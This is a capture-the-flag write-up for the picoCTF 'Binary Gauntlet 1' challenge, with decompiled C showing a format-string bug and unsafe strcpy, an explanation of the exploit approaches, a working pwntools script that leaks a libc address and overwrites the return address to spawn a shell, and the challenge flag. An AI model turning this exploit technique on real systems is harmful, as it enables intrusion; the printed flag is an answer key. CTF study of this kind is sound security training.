# Binary Gauntlet 1

## Description

Author: madStacks

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 53437

## Challenge

The binary is similar to the previous challenge, except that the flag is no longer read into memory, there is no segfault handler, and a stack address leak has been added.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

### Decompiled code

```c
undefined8 main(undefined8 argc, char **argv)
{
    char **var_80h;
    int64_t var_74h;
    char *format;
    
    var_74h._0_4_ = (undefined4)argc;
    format = (char *)sym.imp.malloc(1000);
    sym.imp.printf(0x4007d4, (int64_t)&var_74h + 4);
    sym.imp.fflush(_reloc.stdout);
    sym.imp.fgets(format, 1000, _reloc.stdin);
    format[999] = '\0';
    sym.imp.printf(format);
    sym.imp.fflush(_reloc.stdout);
    sym.imp.fgets(format, 1000, _reloc.stdin);
    format[999] = '\0';
    sym.imp.strcpy((int64_t)&var_74h + 4, format, format);
    return 0;
}
```

## Intended Solution

Note that NX is disabled.
Therefore, if we can write shellcode onto the stack and jump to it, we can execute whatever we want.

The unsafe call to `strcpy` is still present, which we can use to load our shellcode.
We have to be careful to not include nullbytes, as it will stop copying our payload into the buffer.

At the end of the payload, we can overwrite the saved return address to point at our shellcode.
The address we want to overwrite it with is at the start of the buffer, which is leaked through a `printf` call at the start of the program.

## Catch-all Solution

Due to a format string vulnerability, it is possible to leak the address of libc.

As `main` will return into `__libc_start_main`, most of the address for all libc functions is already filled in, and we just have to overwrite the last couple bytes to jump anywhere we want in libc.

By jumping to a one gadget, as long as the correct parameters are set, we can spawn a shell without needing to use the executable stack or stack leak.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./gauntlet")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("mercury.picoctf.net", 19968)


def main():
    r = conn()

    if args.LOCAL:
        context.terminal = ["tmux", "splitw", "-h"]
        #gdb.attach(r, 'b*0x00400727')

    r.sendline('%p ' * 23)

    r.recvline()
    leak = r.recvline().decode()
    print(leak)
    LibcRet = int(leak.split()[22], 0)

    print(LibcRet)

    LibcBase = LibcRet - 0x021bf7;
    OneGadget = LibcBase + 0x4f432;

    payload = flat({
        0x78: OneGadget,
    })

    print(payload)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

## Flag

`7504344981b9288c5669150ada84894e`

